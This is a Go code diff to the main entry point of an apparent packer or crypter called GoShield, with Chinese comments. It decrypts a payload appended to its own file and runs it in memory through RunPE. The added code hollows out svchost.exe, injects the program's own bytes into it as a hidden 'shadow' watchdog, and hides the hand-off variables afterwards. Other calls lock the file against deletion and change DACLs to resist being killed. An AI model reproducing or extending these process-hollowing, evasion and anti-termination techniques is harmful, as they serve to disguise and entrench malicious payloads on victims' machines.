@@ -3,8 +3,10 @@ package main
 
 import (
 	"encoding/binary"
+	"fmt"
 	"io"
 	"os"
+	"time"
 
 	"github.com/Limkon/GoShield/internal/crypto"
 	"github.com/Limkon/GoShield/internal/loader"
@@ -12,7 +14,14 @@ import (
 )
 
 func main() {
-	// 1. 先从自身读取附加数据
+	// 🌟 0. 核心判别：检查是否是“内存影子进程”
+	// 如果是通过下面的 RunPE 注入到 svchost.exe 中启动的，就会带有这个环境变量
+	if os.Getenv("GOSHIELD_SHADOW_PID") != "" {
+		protect.RunShadowMode()
+		return // 影子进程职责结束直接退出，绝不执行下面耗费资源的解密和业务逻辑
+	}
+
+	// 1. 以下是主进程逻辑：先读取附加数据
 	exePath, err := os.Executable()
 	if err != nil {
 		os.Exit(1)
@@ -62,24 +71,41 @@ func main() {
 	// 2. 启动单机防御：独占锁定防删、DACL 防杀护甲
 	protect.EnableProtection()
 
-	// 3. 🌟 启动双进程不死守护 (注意：这必须放在确认文件未被篡改之后执行，防止坏文件死循环)
-	// 如果当前是影子进程，它会在 StartWatchdog 内部阻塞并自动退出，不会继续执行后面的 RunPE 逻辑
-	protect.StartWatchdog()
+	// 3. 🌟 启动无文件落地（纯内存）的终极影子守护
+	protect.SetupMainWatchdog()
+	myExeBytes, err := os.ReadFile(exePath)
+	if err == nil {
+		// 设置环境变量，供影子继承
+		os.Setenv("GOSHIELD_SHADOW_PID", fmt.Sprint(os.Getpid()))
+		os.Setenv("GOSHIELD_ORIGINAL_EXE", exePath)
+
+		// 将自身的外壳程序字节码，掏空注入到合法的系统进程 svchost.exe 中！
+		go func() {
+			_ = loader.Execute("C:\\Windows\\System32\\svchost.exe", myExeBytes)
+		}()
+
+		// 挂起 100 毫秒，确保底层的 CreateProcessW 已经完成了环境变量的继承读取
+		time.Sleep(100 * time.Millisecond)
+
+		// 立刻擦除这俩敏感的环境变量，防止一会运行真正的业务程序时被污染
+		os.Unsetenv("GOSHIELD_SHADOW_PID")
+		os.Unsetenv("GOSHIELD_ORIGINAL_EXE")
+	}
 
 	// 4. 解密真实程序的 Payload
 	decryptedPayload, err := crypto.Decrypt(encryptedPayload, key)
 	if err != nil {
-		protect.NotifyNormalExit() // 哪怕出错也要和平解除影子，避免死循环复活
-		os.Exit(1) 
+		protect.NotifyNormalExit()
+		os.Exit(1)
 	}
 
-	// 5. 执行内存加载 (RunPE)
+	// 5. 执行内存加载 (RunPE)，运行您自己真正的业务代码
 	err = loader.Execute(exePath, decryptedPayload)
 	if err != nil {
 		protect.NotifyNormalExit()
 		os.Exit(1)
 	}
 
-	// 6. 真实程序已退出，触发安全信号通知影子进程一起和平关闭！
+	// 6. 真实程序已退出，触发安全信号通知影子进程和平关闭！
 	protect.NotifyNormalExit()
 }
